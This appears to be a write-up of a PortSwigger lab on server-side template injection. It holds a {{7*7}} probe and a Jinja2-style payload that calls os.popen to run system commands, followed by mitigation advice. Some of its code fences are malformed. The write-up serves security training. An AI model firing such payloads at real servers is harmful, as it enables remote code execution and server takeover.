# Server-Side Template Injection (SSTI) – Remote Code Execution

## Overview

The application is vulnerable to Server-Side Template Injection in the `name` parameter. User input is embedded into a template and executed on the server.

## Lab

https://portswigger.net/web-security/server-side-template-injection/lab-basic

## Steps to Reproduce

1. Identify injection point:

```id="p2x9dq"
GET /?name=test HTTP/1.1
Host: target.com
```

2. Test for template evaluation:

```id="z7k1hs"
GET /?name={{7*7}} HTTP/1.1
Host: target.com
```

3. Observe response:

````
49
``` id="b6n3fa"

4. Execute system command (example for common engines):
``` id="m4v8ty"
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
````

## Payload Used

```id="q9r2cw"
{{7*7}}
```

## Result

The server evaluates template expressions, confirming SSTI. Further payloads allow command execution on the host.

## Impact

An attacker can achieve Remote Code Execution, access sensitive data, and fully compromise the server.

## Tools

* Burp Suite (Proxy)
* Web Browser

## Mitigation

* Avoid rendering user input in templates
* Use sandboxed template environments
* Apply strict input validation
* Disable dangerous template features (e.g., object access, exec functions)
